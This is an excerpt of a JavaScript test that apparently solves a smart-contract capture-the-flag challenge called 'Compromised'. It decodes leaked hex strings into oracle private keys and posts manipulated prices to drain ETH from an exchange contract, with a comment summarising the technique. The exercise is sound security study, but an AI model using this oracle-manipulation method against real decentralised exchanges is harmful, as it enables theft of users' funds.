...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    /*
     * The main observation here is that the hexa-decimal strings are actually oracle source private keys that are compromised.
     * You use those private keys to manipulate oracle prices to buy low and sell high and take all ETH from exchange.
     */
    const getWallet = (data) => {
      const base64 = Buffer.from(data.split(` `).join(""), "hex").toString(
        "utf8"
      );
    ...
    const price = await ethers.provider.getBalance(this.exchange.address);
    await this.oracle.connect(source1).postPrice("DVNFT", price.toString());

    await this.oracle.connect(source2).postPrice("DVNFT", price.toString());
